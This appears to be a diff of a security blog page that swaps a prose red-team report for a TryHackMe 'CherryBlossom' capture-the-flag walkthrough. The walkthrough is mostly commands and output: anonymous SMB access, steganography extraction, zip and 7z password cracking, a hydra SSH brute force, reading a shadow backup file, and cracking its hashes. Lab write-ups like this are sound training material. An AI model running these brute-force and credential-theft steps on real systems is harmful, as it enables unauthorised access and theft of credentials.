@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>FinTech Red Team Engagement | Technical Intelligence Labs</title>
+    <title>CherryBlossom | Technical Intelligence Labs</title>
     <link rel="stylesheet" href="../css/custom.css">
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
@@ -106,53 +106,183 @@
         <!-- Post Header -->
         <header class="mb-12 border-b border-slate-800 pb-12">
             <div class="flex items-center gap-4 text-xs font-mono text-slate-500 mb-6 uppercase tracking-widest">
-                <span class="px-2 py-1 bg-slate-900 border border-slate-800 rounded text-accent-green">ethical-hacking</span>
-                <span>// 2025-12-30</span>
-                <span>// ID: REF-FinTech Red Team Engagement</span>
+                <span class="px-2 py-1 bg-slate-900 border border-slate-800 rounded text-accent-green">tryhackme</span>
+                <span>// 2026-01-05</span>
+                <span>// ID: REF-CherryBlossom</span>
             </div>
             
-            <h1 class="text-3xl md:text-5xl font-bold text-white mb-8 leading-tight font-mono">FinTech Red Team Engagement</h1>
+            <h1 class="text-3xl md:text-5xl font-bold text-white mb-8 leading-tight font-mono">CherryBlossom</h1>
             
             <div class="flex flex-wrap gap-2">
                 <!-- Tags populated by python -->
-                <!-- ['red teaming', 'fintech security', 'APT simulation', 'spear-phishing', 'lateral movement', 'domain compromise', 'cobalt strike', 'ethical hacking'] -->
+                <!-- tryhackme -->
             </div>
         </header>
 
         <!-- Markdown Body -->
         <div class="markdown-content">
             <hr />
-<h1>FinTech Red Team Engagement Report</h1>
-<h2>Introduction</h2>
-<p>This report details a full-scope Red Team operation conducted against a prominent digital bank. The engagement was designed to simulate the tactics, techniques, and procedures (TTPs) of an Advanced Persistent Threat (APT) group, with the primary objective of assessing the organization's resilience against sophisticated cyberattacks. The operation aimed to achieve domain compromise, evaluating the security controls, detection capabilities, and incident response processes of the target environment. The project also served as a practical exploration of advanced ethical hacking methodologies.</p>
-<h2>Reconnaissance</h2>
-<p>Initial intelligence gathering focused on open-source information (OSINT) to identify key personnel, organizational structures, and potential technological footprints relevant to the target digital bank. This phase aimed to build a comprehensive profile of the target environment, identifying potential entry points and suitable candidates for social engineering attacks. Specific attention was paid to identifying email address formats and publicly available employee information to craft credible spear-phishing lures.</p>
-<h2>Enumeration</h2>
-<p>Following the reconnaissance phase, targeted enumeration was conducted to further refine potential attack vectors. This involved analyzing identified employee profiles and external-facing infrastructure for any vulnerabilities or misconfigurations that could facilitate initial access. The data collected was critical for tailoring subsequent exploitation attempts, particularly for crafting highly personalized and convincing spear-phishing emails.</p>
-<h2>Exploitation</h2>
-<p>The primary method for gaining initial access was a meticulously planned spear-phishing campaign. Tailored emails, designed to bypass existing email security controls and exploit human factors, were sent to identified targets within the organization.</p>
-<h3>Initial Access &amp; Command and Control (C2) Establishment</h3>
-<p>Upon successful execution of a malicious payload by a target, initial access was gained on a user workstation. A sophisticated command and control (C2) channel was established utilizing <strong>Cobalt Strike</strong>. Cobalt Strike's beacon functionality provided a robust and covert communication pathway for subsequent post-exploitation activities, allowing for remote code execution, file transfers, and system information gathering without raising immediate suspicion.</p>
-<h2>Privilege Escalation &amp; Lateral Movement</h2>
-<p>With initial access established, the focus shifted to escalating privileges on the compromised host and then moving laterally within the network to reach high-value assets, specifically the domain controllers.</p>
-<h3>Local Privilege Escalation</h3>
-<p>Techniques were employed to escalate privileges on the initial foothold, moving from a standard user context to administrative or system-level access. This critical step enabled broader access to local resources and the ability to extract credentials or execute privileged operations necessary for lateral movement.</p>
-<h3>Lateral Movement</h3>
-<p>Leveraging the elevated privileges and collected credentials, various lateral movement techniques were executed to navigate deeper into the target's internal network. This involved:<br />
-*   <strong>Pass-the-Hash/Ticket</strong>: Reusing compromised NTLM hashes or Kerberos tickets to authenticate to other systems.<br />
-*   <strong>Service Creation/Modification</strong>: Installing or modifying services on remote machines to execute code.<br />
-*   <strong>Remote Code Execution (WMI/PsExec)</strong>: Utilizing administrative tools to execute commands remotely.</p>
-<p>Through a systematic approach, the Red Team mapped critical network segments and identified pathways leading to the domain controllers.</p>
-<h3>Domain Controller Compromise</h3>
-<p>The culmination of the lateral movement phase was the successful compromise of the organization's domain controllers. This provided full control over the Active Directory environment, signifying a complete breach of the target's core identity management system. The compromise demonstrated the potential for an APT to establish persistent access and exert extensive control over the entire enterprise network.</p>
-<h2>Conclusion</h2>
-<p>This Red Team engagement successfully demonstrated the ability of a simulated APT group to compromise the domain controllers of a digital bank. The operation highlighted critical vulnerabilities in the organization's security posture, specifically regarding its susceptibility to spear-phishing attacks and the effectiveness of its internal network segmentation and detection capabilities.</p>
-<p>Key achievements include:<br />
-*   Successful initial access via a sophisticated spear-phishing campaign.<br />
-*   Effective deployment and utilization of <strong>Cobalt Strike</strong> for C2 operations and post-exploitation.<br />
-*   Demonstrated expertise in complex <strong>Red Teaming</strong> methodologies, including privilege escalation and advanced lateral movement techniques.<br />
-*   Validation of an attack path leading to full domain compromise, mimicking real-world APT TTPs.</p>
-<p>The detailed findings of this engagement have been thoroughly documented in a comprehensive technical report, providing actionable recommendations for strengthening the digital bank's security defenses against advanced persistent threats.</p>
+<pre class="codehilite"><code>PORT    STATE SERVICE      REASON
+22/tcp  open  ssh          syn-ack ttl 62
+139/tcp open  netbios-ssn  syn-ack ttl 62
+445/tcp open  microsoft-ds syn-ack ttl 62
+
+Host script results:
+| smb-enum-shares: 
+|   note: ERROR: Enumerating shares failed, guessing at common ones (SMB: Failed to receive bytes: TIMEOUT)
+|   account_used: &lt;blank&gt;
+|   \\10.64.149.126\IPC$: 
+|     Type: STYPE_IPC_HIDDEN
+|     Comment: IPC Service (Samba 4.7.6-Ubuntu)
+|     Users: 1
+|     Max Users: &lt;unlimited&gt;
+|     Path: C:\tmp
+|_    Anonymous access: READ/WRITE
+</code></pre>
+
+<pre class="codehilite"><code>smbclient //10.64.149.126/Anonymous -N -t 900
+
+Anonymous login successful
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; ls
+  .                                   D        0  Sun Feb  9 19:22:51 2020
+  ..                                  D        0  Sun Feb  9 12:48:18 2020
+  journal.txt                         N  3470998  Sun Feb  9 19:20:53 2020
+ge
+                10253588 blocks of size 1024. 4671704 blocks available
+smb: \&gt; get journal.txt
+getting file \journal.txt of size 3470998 as journal.txt (10.3 KiloBytes/sec) (average 10.3 KiloBytes/sec)
+</code></pre>
+
+<pre class="codehilite"><code>cat journal.txt | base64 -d &gt; output
+
+file output
+output: PNG image data, 1280 x 853, 8-bit/color RGB, non-interlaced
+</code></pre>
+
+<pre class="codehilite"><code>stegpy output         
+File _journal.zip succesfully extracted from output
+
+unzip _journal.zip
+Archive:  _journal.zip
+file #1:  bad zipfile offset (local header sig):  0
+
+file _journal.zip
+_journal.zip: JPEG image data
+
+
+ls
+journal.txt  _journal.zip  output
+
+fcrackzip -uDp /usr/share/wordlists/rockyou.txt _journal.zip
+found id d8ffd8ff, '_journal.zip' is not a zipfile ver 2.xx, skipping
+no usable files found
+</code></pre>
+
+<p>it thinks it’s a JPEG…<br />
+Open it up in <code>hexeditor</code> and we’ll check to see if it’s had its magic number tampered with:</p>
+<p>Well, considering that the magic number for a standard <code>.zip</code> zipfile is <code>50 4B 03 04</code>, I have a feeling we might be right on the money with this one.</p>
+<p><code>file _journal.zip                                            
+_journal.zip: Zip archive data, made by v3.0 UNIX, extract using at least v2.0, last modified Feb 10 2020 00:01:42, uncompressed size 70434, method=deflate</code></p>
+<pre class="codehilite"><code>fcrackzip -uDp /usr/share/wordlists/rockyou.txt  _journal.zip
+PASSWORD FOUND!!!!: pw == september
+</code></pre>
+
+<pre class="codehilite"><code>/usr/share/john/7z2john.pl Journal.ctz &gt; hash.txt
+ATTENTION: the hashes might contain sensitive encrypted data. Be careful when sharing or posting these hashes
+</code></pre>
+
+<pre class="codehilite"><code>john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+
+Press 'q' or Ctrl-C to abort, almost any other key for status
+tigerlily        (Journal.ctz)     
+1g 0:00:01:55 DONE (2025-12-24 12:47) 0.008660g/s 48.49p/s 48.49c/s . 
+</code></pre>
+
+<pre class="codehilite"><code>└─$ 7z e Journal.ctz
+
+7-Zip 25.01 (x64) : Copyright (c) 1999-2025 Igor Pavlov : 2025-08-03
+ 64-bit locale=en_US.UTF-8 Threads:4 OPEN_MAX:1024, ASM
+
+Scanning the drive for archives:
+1 file, 70434 bytes (69 KiB)
+
+Extracting archive: Journal.ctz
+--
+Path = Journal.ctz
+Type = 7z
+Physical Size = 70434
+Headers Size = 146
+Method = LZMA2:16 7zAES
+Solid = -
+Blocks = 1
+
+
+Enter password (will not be echoed):
+Everything is Ok
+
+Size:       158136
+Compressed: 70434
+</code></pre>
+
+<p>now can open <code>Journal.ctd</code> and find more info and can find user and can be found some wordlists that user used to create pwds</p>
+<p>so i decode all and make all that wordlists and use into  bruteforce user ssh</p>
+<pre class="codehilite"><code>└─$ hydra -l lily -P cherry-blossom.txt ssh://10.64.149.126
+Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-12-24 13:18:42
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 1 task per 1 server, overall 1 task, 1 login try (l:1/p:1), ~1 try per task
+[DATA] attacking ssh://10.64.149.126:22/
+[22][ssh] host: 10.64.149.126   login: lily   password: Mr.$un$hi..
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-12-24 13:18:50
+</code></pre>
+
+<pre class="codehilite"><code>[-] Location and Permissions (if accessible) of .bak file(s):
+-rw------- 1 root shadow 771 Feb  9  2020 /var/backups/gshadow.bak
+-r--r--r-- 1 root shadow 1481 Feb  9  2020 /var/backups/shadow.bak
+-rw------- 1 root root 936 Feb  9  2020 /var/backups/group.bak
+-rw------- 1 root root 2382 Feb  9  2020 /var/backups/passwd.bak
+</code></pre>
+
+<pre class="codehilite"><code>/var/backups/shadow.bak
+</code></pre>
+
+<pre class="codehilite"><code>johan:$6$zV7zbU1b$FomT/aM2UMXqNnqspi57K/hHBG8DkyACiV6ykYmxsZG.vLALyf7kjsqYjwW391j1bue2/.SVm91uno5DUX7ob0:18301:0:99999:7:::
+lily:$6$3GPkY0ZP$6zlBpNWsBHgo6X5P7kI2JG6loUkZBIOtuOxjZpD71spVdgqM4CTXMFYVScHHTCDP0dG2rhDA8uC18/Vid3JCk0:18301:0:99999:7:::
+sshd:*:18301:0:99999:7:::
+</code></pre>
+
+<pre class="codehilite"><code>john --wordlist=cherry-blossom.txt hashes.txt
+
+Using default input encoding: UTF-8
+Loaded 2 password hashes with 2 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Mr.$un$hin3      (lily)     
+##scuffleboo##   (johan)     
+2g 0:00:00:03 DONE (2025-12-24 13:42) 0.5988g/s 2146p/s 2299c/s 2299C/s #shauna#..#imab#3899261#
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed. 
+</code></pre>
+
+<pre class="codehilite"><code>lily@cherryblossom:~$ su johan
+Password: 
+
+johan@cherryblossom:~$ ls -la
+total 48
+
+-rw-rw-r--  1 johan johan   38 Feb 10  2020 user.txt
+-rw-rw-r--  1 johan johan  180 Feb  9  2020 .wget-hsts
+johan@cherryblossom:~$ cat user.txt
+</code></pre>
+
+<p><code>CVE-2019-18364</code></p>
+<pre class="codehilite"><code>root/root.txt
+</code></pre>
         </div>
     </main>
 
